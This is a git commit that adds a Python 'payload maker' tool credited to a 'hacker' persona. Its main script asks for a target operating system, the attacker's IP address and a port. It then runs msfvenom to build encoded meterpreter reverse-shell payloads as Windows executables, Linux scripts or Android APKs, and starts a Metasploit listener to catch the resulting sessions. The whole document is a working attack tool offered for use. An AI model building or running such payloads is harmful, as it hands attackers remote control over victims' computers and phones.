fe2b71e930a205fd460d6c94deb093cf628184f8
HAKDAD <kottevamsi38@gmail.com>
2021-04-18 14:54:03 +0530

    Add files via upload

---
+++ pm_install.py
@@ -0,0 +1,44 @@
+#! /usr/bin/python
+#@mr_kali_hacker
+############################################
+############################################
+#imports
+from os import system
+import sys
+import signal
+import os
+import subprocess
+import time
+import socket
+import random
+################################################
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+###############################################
+###############################################
+os.system('clear')
+os.system('mkdir /root/hakdad_generated_payloads')
+print("\033[92m\nDIRECTORY CREATED AT /root/hakdad_generated_payloads")
+print ("                          ")
+print ("\033[93m----INSTALLING DEPENDENCIES----")
+print ("                          ")
+app = ("install")
+subprocess.call(["apt", "update -y"])
+subprocess.call(["apt", app, "python -y"])
+subprocess.call(["apt", app, "python2 -y"])
+subprocess.call(["apt", app, "toilet -y"])
+subprocess.call(["apt", app, "lolcat -y"])
+subprocess.call(["apt", app, "figlet -y"])
+time.sleep(3)
+print ("\033[91m\n---- RUN THIS ONLY ONCE ----")
+
+print ("\033[92m\n---- REQUIREMENTS INSTALLED \nNOW USE ' python pm_main.py ' TO USE THE TOOL ----")
+##############################################
+##############################################
+
---
+++ pm_main.py
@@ -0,0 +1,86 @@
+#! /usr/bin/python
+#@mr_kali_hacker
+############################################
+############################################
+#imports
+from os import system
+import sys
+import signal
+import os
+import subprocess
+import time
+import socket
+import random
+################################################
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+###############################################
+###############################################
+
+##############################################
+##############################################
+os.system('clear')
+os.system("figlet _____________")
+os.system("toilet -f big '   HAKDAD ' -F gay | lolcat")
+os.system("toilet -f big 'Payload maker ' -F gay | lolcat")
+print ("                                                     --version 1.0")
+os.system("figlet /\/\/\/\/\/\/\/\/\/\/\/\/\/////////////////")
+print
+print (" Author NAME      :   VAMSI")
+print (" YOUTUBE CHANNEL  :   HAKDAD")
+print (" INSTAGRAM ID     :   Mr_kali_hacker")
+print
+
+os = raw_input("""\033[94m[*] \033[91mPLEASE \033[91mENTER TARGET OPERATING SYSTEM \n\t\t\t1.windows\n\t\t\t2.android\n\t\t\t3.linux\033[97m\n>>> \033[93m""")
+                                       
+ip_address = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Your IP Address : \033[97m>>> \033[93m")
+port_given = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Port Number     : \033[97m>>> \033[93m")
+save_directory = "/root/hakdad_generated_payloads"
+name = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Payload Name: \033[97m>>> \033[93m")
+
+
+if os == "1":
+	payload = "windows/meterpreter/reverse_tcp"
+	formation = "exe"
+	platform = "Windows"
+	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)
+
+if os == "3":
+	payload = "linux/meterpreter/reverse_tcp"
+	formation = "sh"
+	platform = "Linux"
+	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)
+
+if os == "2":
+	payload = "android/meterpreter/reverse_tcp"
+	formation = "apk"
+	platform = "Android"
+	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} X > {4}/{5}.{6}".format(platform, payload, ip_address, port_given, save_directory, name, formation)
+system(command)
+
+print("\033[94m[*]\033[91m>>Payload Created Successfully. \033[93m")
+print("\033[94m[*] \033[91m>>Payload Saved In  Directory /root/hakdad_generated_payloads \033[93m")
+
+print("\n\n\t\033[94m[*]\033[91m Starting Metasploit Listener \033[93m[*]")
+
+
+handler_file = "{0}handler.rc".format(save_directory)
+f = open(handler_file, 'a')
+handler_options = """use multi/handler
+		                 set PAYLOAD {0}
+		                 set LHOST {1}
+		                 set LPORT {2}
+		                 set ExitOnSession false
+		                 exploit -j""".format(payload, ip_address, port_given)
+
+f.write(handler_options)
+f.close()
+handler = "msfconsole -q -r {0}".format(handler_file)
+system(handler)
+
